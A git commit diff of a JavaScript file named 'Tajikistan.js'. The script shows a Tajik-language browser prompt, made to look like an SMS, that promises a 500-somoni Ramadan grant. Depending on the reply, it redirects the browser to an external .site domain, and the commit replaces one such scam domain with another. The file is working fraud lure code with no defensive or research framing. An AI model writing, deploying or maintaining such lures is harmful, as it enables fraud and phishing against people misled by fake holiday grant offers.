b963f64048a66e119dde367b0aa9e719f3bef6b2
newetijazz23 <newetijazz23@gmail.com>
2026-01-28 11:28:37 +0100

    Update Tajikistan.js

--- Tajikistan.js
+++ Tajikistan.js
@@ -1,5 +1,5 @@
 var password = '500 сомонӣ гиред'
 password=prompt('SMS: Хуш омадед ба гранти пулии 500 сомонӣ барои таҷлили Иди Рамазони имсола!, Барои гирифтани ин пешниҳоди олӣ "OK"-ро клик кунед..','500 сомонӣ гиред');
 if (password != '500 сомонӣ гиред') {
-location.href='https://www.olpresz.site/TJS500-Ramadan';
+location.href='https://www.mpakvrz.site/TJS500-Ramadan';
 }
